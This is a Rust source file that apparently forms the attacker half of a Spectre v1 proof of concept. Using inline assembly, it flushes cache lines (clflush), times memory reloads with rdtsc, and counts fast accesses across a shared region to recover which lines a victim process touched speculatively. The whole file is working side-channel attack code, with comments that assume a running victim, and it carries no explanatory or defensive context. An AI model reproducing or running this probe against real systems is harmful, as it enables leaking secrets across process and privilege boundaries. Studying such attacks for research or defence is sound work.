#![feature(asm)]

mod utils;
mod spec;
use utils::busy_waiting;

const PAGE_SIZE: usize = 1 << 12; //bytes

const HIT_THRESHOLD: u64 = 160;
const NRETIRES: usize = 1500;

fn clflush_page(page_address: u64) {
    let _cl_size: usize = 1 << 6; // bytes

    for cline in 0..PAGE_SIZE / spec::SPECV1_OFFSET {
        // flush 4 times
        let cl_address = page_address + (cline * spec::SPECV1_OFFSET) as u64;
        clflush(cl_address);
    }
}

fn clflush(address: u64) {
    unsafe{
        asm!{
            "clflush [rax]",
            in("rax") address,
        };
    }
}

fn prime(address: u64, npages: usize) {
    for page in 0..npages {
        let page_address = address + (page * PAGE_SIZE) as u64;
        clflush_page(page_address);
    }
}

fn rdtsc() -> u64 {
    let result: u64;
    unsafe{
        asm!{"
            mfence
            rdtsc
            mfence
            shl rdx, 32
            or rax, rdx
            ",
            out("rax") result,
            out("rdx") _,
        };
    }
    result
}

fn time_access(address: u64) -> u64 {
    let start = rdtsc();
    unsafe{
        asm!{"
            mov rdi, [rdi]
            lfence
            ", in("rdi") address
        };
    }
    let end = rdtsc();
    end - start
}

fn get_hits(array: &[u64], hits: &mut [usize]) {
    for (index, e) in array.iter().enumerate() {
        if *e != 0 && *e < HIT_THRESHOLD {
            hits[index] += 1;
        }
    }
}

fn probe(address: u64, hits: &mut [usize]) {
    let mut elapsed: [u64; spec::SPECV1_N_CL] = [0; spec::SPECV1_N_CL];

    for cl in 0..spec::SPECV1_N_CL - 1 {
        let cl_shuffle = (cl * 167 + 13) & (spec::SPECV1_N_CL - 1);
        let cl_address = address + (cl_shuffle * spec::SPECV1_OFFSET) as u64;

        elapsed[cl_shuffle] = time_access(cl_address);
    }

    get_hits(&elapsed, hits);
}

fn report_hits(hits: &[usize]) {
    let iter = hits.iter().enumerate();
    let filtered = iter.filter(|&(_, item)| *item > 0);

    filtered.for_each(|(index, item)| println!("hits: index {}, nhits {}", index, item));
}

fn main() {
    let mut hits: [usize; spec::SPECV1_N_CL] = [0; spec::SPECV1_N_CL];

    // victim must have started
    prime(spec::SPECV1_BASE, spec::SPECV1_NPAGES);

    // victim must receive input
    for _ in 0..NRETIRES - 1 {
        probe(spec::SPECV1_BASE, &mut hits);
        busy_waiting(8);
        prime(spec::SPECV1_BASE, spec::SPECV1_NPAGES);
    }

    report_hits(&hits);
}
